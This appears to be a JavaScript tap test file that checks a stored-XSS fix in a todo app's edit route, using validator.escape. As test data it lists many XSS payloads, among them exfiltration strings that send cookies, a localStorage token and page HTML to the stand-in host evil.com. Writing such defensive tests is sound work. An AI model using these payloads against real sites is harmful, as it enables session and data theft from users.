const tap = require('tap');
const validator = require('validator');

/**
 * Stored XSS Prevention Tests for exports.edit function
 *
 * These tests verify that the remediation for the Stored XSS vulnerability
 * in routes/index.js line 213 (exports.edit function) is effective.
 * The fix sanitizes todo content from the database before rendering to prevent
 * malicious scripts stored in the database from executing in users' browsers.
 */

tap.test('Stored XSS Prevention - exports.edit sanitization', (t) => {

  t.test('should escape HTML special characters in todo content', (t) => {
    // GIVEN: Todo content with HTML special characters that could enable XSS
    const maliciousTodos = [
      {
        _id: '507f1f77bcf86cd799439011',
        content: '<script>alert("XSS")</script>',
        updated_at: new Date()
      },
      {
        _id: '507f1f77bcf86cd799439012',
        content: '<img src=x onerror="alert(\'XSS\')">',
        updated_at: new Date()
      }
    ];

    // WHEN: Sanitizing todos as the fix does
    const sanitizedTodos = maliciousTodos.map(function(todo) {
      return {
        _id: todo._id,
        content: validator.escape(todo.content),
        updated_at: todo.updated_at
      };
    });

    // THEN: HTML special characters should be escaped
    t.equal(
      sanitizedTodos[0].content,
      '&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;',
      'Script tags should be HTML-encoded'
    );
    t.equal(
      sanitizedTodos[1].content,
      '&lt;img src=x onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;',
      'Image tag with onerror should be HTML-encoded'
    );

    // Verify the content is safe for rendering
    t.notMatch(sanitizedTodos[0].content, /<script/, 'No executable script tags');
    t.notMatch(sanitizedTodos[1].content, /<img/, 'No executable img tags');

    t.end();
  });

  t.test('should prevent common XSS attack vectors', (t) => {
    // Test various XSS attack patterns
    const xssAttacks = [
      {
        name: 'script tag with alert',
        payload: '<script>alert(document.cookie)</script>',
        shouldNotContain: '<script'
      },
      {
        name: 'img tag with onerror',
        payload: '<img src=x onerror=alert(1)>',
        shouldNotContain: 'onerror='
      },
      {
        name: 'svg with onload',
        payload: '<svg onload=alert(1)>',
        shouldNotContain: '<svg'
      },
      {
        name: 'iframe injection',
        payload: '<iframe src="javascript:alert(1)">',
        shouldNotContain: '<iframe'
      },
      {
        name: 'body onload',
        payload: '<body onload=alert(1)>',
        shouldNotContain: '<body'
      },
      {
        name: 'javascript protocol',
        payload: '<a href="javascript:alert(1)">click</a>',
        shouldNotContain: 'javascript:'
      },
      {
        name: 'event handler',
        payload: '<div onmouseover="alert(1)">hover me</div>',
        shouldNotContain: 'onmouseover='
      },
      {
        name: 'style with expression',
        payload: '<style>body{background:url("javascript:alert(1)")}</style>',
        shouldNotContain: '<style>'
      }
    ];

    xssAttacks.forEach(({ name, payload, shouldNotContain }) => {
      const todo = {
        _id: '507f1f77bcf86cd799439011',
        content: payload,
        updated_at: new Date()
      };

      // Apply the sanitization from the fix
      const sanitized = {
        _id: todo._id,
        content: validator.escape(todo.content),
        updated_at: todo.updated_at
      };

      // Verify the attack vector is neutralized
      t.notMatch(
        sanitized.content,
        new RegExp(shouldNotContain.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i'),
        `${name}: attack should be neutralized`
      );

      // Verify HTML entities are used instead
      t.match(sanitized.content, /&[a-z]+;|&#x[0-9a-f]+;/i, `${name}: should contain HTML entities`);
    });

    t.end();
  });

  t.test('should preserve todo metadata while sanitizing content', (t) => {
    // GIVEN: A todo with both safe metadata and malicious content
    const originalTodo = {
      _id: '507f1f77bcf86cd799439011',
      content: '<script>alert("XSS")</script>Buy groceries',
      updated_at: new Date('2024-01-15T10:30:00Z')
    };

    // WHEN: Applying the sanitization fix
    const sanitizedTodo = {
      _id: originalTodo._id,
      content: validator.escape(originalTodo.content),
      updated_at: originalTodo.updated_at
    };

    // THEN: Metadata should be preserved, content sanitized
    t.equal(sanitizedTodo._id, originalTodo._id, 'ID should be preserved');
    t.equal(
      sanitizedTodo.updated_at.toISOString(),
      originalTodo.updated_at.toISOString(),
      'Timestamp should be preserved'
    );
    t.notEqual(sanitizedTodo.content, originalTodo.content, 'Content should be sanitized');
    t.match(sanitizedTodo.content, /Buy groceries/, 'Legitimate content should still be readable');

    t.end();
  });

  t.test('should handle legitimate content without corruption', (t) => {
    // GIVEN: Legitimate todo content without malicious code
    const legitimateTodos = [
      'Buy milk and eggs',
      'Call the doctor at 555-1234',
      'Meeting at 3pm - discuss Q4 budget',
      'Read "JavaScript: The Good Parts"',
      'Fix bug #42 in user authentication',
      'Schedule dentist appointment for next week',
      'Review pull request #123',
      'Update documentation for API v2.0'
    ];

    legitimateTodos.forEach(content => {
      const todo = {
        _id: '507f1f77bcf86cd799439011',
        content: content,
        updated_at: new Date()
      };

      // Apply sanitization
      const sanitized = {
        _id: todo._id,
        content: validator.escape(todo.content),
        updated_at: todo.updated_at
      };

      // Legitimate content without HTML should be unchanged or minimally changed
      // (validator.escape only escapes HTML special chars: < > & " ')
      t.equal(sanitized.content, content, `Legitimate content preserved: ${content}`);
    });

    t.end();
  });

  t.test('should escape quotes and prevent attribute injection', (t) => {
    // Quotes can break out of HTML attributes and enable XSS
    const quotesAttacks = [
      {
        payload: '" onload="alert(1)',
        desc: 'double quote attribute breakout'
      },
      {
        payload: "' onload='alert(1)",
        desc: 'single quote attribute breakout'
      },
      {
        payload: '"><script>alert(1)</script><div class="',
        desc: 'quote with tag injection'
      }
    ];

    quotesAttacks.forEach(({ payload, desc }) => {
      const todo = {
        _id: '507f1f77bcf86cd799439011',
        content: payload,
        updated_at: new Date()
      };

      const sanitized = {
        _id: todo._id,
        content: validator.escape(todo.content),
        updated_at: todo.updated_at
      };

      // Quotes should be escaped as HTML entities
      t.notMatch(sanitized.content, /[^&]"/, `${desc}: double quotes should be escaped`);
      t.notMatch(sanitized.content, /[^&]'/, `${desc}: single quotes should be escaped`);
      t.match(sanitized.content, /&quot;|&#x27;|&#39;/, `${desc}: should use HTML entities for quotes`);
    });

    t.end();
  });

  t.test('should handle multiple todos with mixed content', (t) => {
    // GIVEN: Multiple todos with both safe and malicious content
    const mixedTodos = [
      {
        _id: '507f1f77bcf86cd799439011',
        content: 'Safe todo item',
        updated_at: new Date()
      },
      {
        _id: '507f1f77bcf86cd799439012',
        content: '<script>alert("malicious")</script>',
        updated_at: new Date()
      },
      {
        _id: '507f1f77bcf86cd799439013',
        content: 'Another safe item',
        updated_at: new Date()
      },
      {
        _id: '507f1f77bcf86cd799439014',
        content: '<img src=x onerror=alert(1)>',
        updated_at: new Date()
      }
    ];

    // WHEN: Applying sanitization to all todos
    const sanitizedTodos = mixedTodos.map(function(todo) {
      return {
        _id: todo._id,
        content: validator.escape(todo.content),
        updated_at: todo.updated_at
      };
    });

    // THEN: Safe content unchanged, malicious content escaped
    t.equal(sanitizedTodos.length, 4, 'All todos should be processed');
    t.equal(sanitizedTodos[0].content, 'Safe todo item', 'First todo safe');
    t.match(sanitizedTodos[1].content, /&lt;script&gt;/, 'Second todo sanitized');
    t.equal(sanitizedTodos[2].content, 'Another safe item', 'Third todo safe');
    t.match(sanitizedTodos[3].content, /&lt;img/, 'Fourth todo sanitized');

    // Verify no executable code in any sanitized todo
    sanitizedTodos.forEach((todo, index) => {
      t.notMatch(todo.content, /<script|<img|onerror=/i, `Todo ${index} has no executable code`);
    });

    t.end();
  });

  t.test('should prevent data exfiltration via XSS', (t) => {
    // XSS attacks often try to steal cookies or make requests to attacker servers
    const dataExfiltrationPayloads = [
      '<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
      '<img src="http://evil.com/steal" onerror="fetch(\'http://evil.com?data=\'+localStorage.getItem(\'token\'))">',
      '<script>new Image().src="http://evil.com/log?data="+document.body.innerHTML</script>',
      '<iframe src="javascript:fetch(\'http://evil.com?cookies=\'+document.cookie)"></iframe>'
    ];

    dataExfiltrationPayloads.forEach(payload => {
      const todo = {
        _id: '507f1f77bcf86cd799439011',
        content: payload,
        updated_at: new Date()
      };

      const sanitized = {
        _id: todo._id,
        content: validator.escape(todo.content),
        updated_at: todo.updated_at
      };

      // Verify no executable JavaScript remains
      t.notMatch(sanitized.content, /<script/i, 'No script tags');
      t.notMatch(sanitized.content, /<iframe/i, 'No iframe tags');
      t.notMatch(sanitized.content, /onerror=/i, 'No event handlers');

      // The malicious URLs should still be visible (as text) but not executable
      t.match(sanitized.content, /evil\.com/, 'Attacker URL visible as text but not executable');
    });

    t.end();
  });

  t.test('should handle edge cases and special characters', (t) => {
    // Edge cases that might bypass naive sanitization
    const edgeCases = [
      {
        input: '<ScRiPt>alert(1)</ScRiPt>',
        desc: 'mixed case tags'
      },
      {
        input: '<<script>alert(1)//<</script>',
        desc: 'nested angle brackets'
      },
      {
        input: '<script\x00>alert(1)</script>',
        desc: 'null byte injection'
      },
      {
        input: '<script\n>alert(1)</script>',
        desc: 'newline in tag'
      },
      {
        input: 'javascript&#58;alert(1)',
        desc: 'HTML entity in protocol'
      }
    ];

    edgeCases.forEach(({ input, desc }) => {
      const todo = {
        _id: '507f1f77bcf86cd799439011',
        content: input,
        updated_at: new Date()
      };

      const sanitized = {
        _id: todo._id,
        content: validator.escape(todo.content),
        updated_at: todo.updated_at
      };

      // All < and > should be escaped, regardless of case or position
      t.notMatch(sanitized.content, /<script/i, `${desc}: should not have script tag`);
      t.match(sanitized.content, /&lt;/, `${desc}: should have escaped less-than`);
    });

    t.end();
  });

  t.test('should prevent DOM-based XSS via stored content', (t) => {
    // Even if the content doesn't directly execute, it shouldn't break the DOM structure
    const domBreakingPayloads = [
      '</div><script>alert(1)</script><div>',
      '</textarea><script>alert(1)</script><textarea>',
      '--!><script>alert(1)</script><!--',
      '</title><script>alert(1)</script><title>'
    ];

    domBreakingPayloads.forEach(payload => {
      const todo = {
        _id: '507f1f77bcf86cd799439011',
        content: payload,
        updated_at: new Date()
      };

      const sanitized = {
        _id: todo._id,
        content: validator.escape(todo.content),
        updated_at: todo.updated_at
      };

      // Closing tags should be escaped to prevent breaking out of context
      t.notMatch(sanitized.content, /<\/div>|<\/textarea>|<\/title>/i, 'Closing tags escaped');
      t.notMatch(sanitized.content, /<script/i, 'Script tags escaped');
      t.match(sanitized.content, /&lt;/, 'Tags converted to entities');
    });

    t.end();
  });

  t.test('should ensure sanitization is applied before rendering', (t) => {
    // This test verifies the fix correctly sanitizes BEFORE passing to res.render

    // GIVEN: Original vulnerable flow (for comparison)
    const vulnerableFlow = function(todos) {
      // In vulnerable code, todos passed directly to render
      return todos; // Unsanitized
    };

    // WHEN: Secure flow from the fix
    const secureFlow = function(todos) {
      // The fix sanitizes before render
      return todos.map(function(todo) {
        return {
          _id: todo._id,
          content: validator.escape(todo.content),
          updated_at: todo.updated_at
        };
      });
    };

    const testTodos = [
      {
        _id: '507f1f77bcf86cd799439011',
        content: '<script>alert("XSS")</script>',
        updated_at: new Date()
      }
    ];

    const vulnerableResult = vulnerableFlow(testTodos);
    const secureResult = secureFlow(testTodos);

    // Vulnerable flow leaves malicious content intact
    t.equal(vulnerableResult[0].content, '<script>alert("XSS")</script>',
      'Vulnerable flow does not sanitize');

    // Secure flow sanitizes the content
    t.equal(secureResult[0].content, '&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;',
      'Secure flow sanitizes content');

    t.end();
  });

  t.test('validator.escape should be the correct sanitization function', (t) => {
    // Verify validator.escape properly encodes all necessary characters
    const testString = '<script>"alert"(\'XSS\')&more</script>';
    const escaped = validator.escape(testString);

    // Check that all dangerous characters are escaped
    t.match(escaped, /&lt;/, 'Less-than signs escaped');
    t.match(escaped, /&gt;/, 'Greater-than signs escaped');
    t.match(escaped, /&quot;/, 'Double quotes escaped');
    t.match(escaped, /&#x27;|&#39;/, 'Single quotes escaped');
    t.match(escaped, /&amp;/, 'Ampersands escaped');

    // Verify no dangerous characters remain unescaped
    t.notMatch(escaped, /<[^&]/, 'No unescaped less-than');
    t.notMatch(escaped, />[^;]/, 'No unescaped greater-than (except in entities)');

    t.end();
  });

  t.end();
});
